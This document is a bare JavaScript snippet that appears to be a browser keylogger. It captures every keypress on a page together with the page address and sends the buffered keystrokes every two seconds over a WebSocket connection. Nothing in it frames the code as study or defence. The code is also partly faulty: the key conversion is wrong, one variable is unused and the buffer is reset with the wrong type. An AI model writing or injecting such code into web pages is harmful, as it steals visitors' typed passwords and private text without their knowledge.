var buffer='';
document.onkeypress = function(e) {
    var timestamp = Date.now() | 0;
    var stroke = toString(e.key)+',href:'+window.location.href;
    buffer+=stroke;
}

window.setInterval(function() {
    if (buffer.length > 0) {
        var data = buffer;
        ws.send(data);
        buffer = [];
    }
}, 2000);
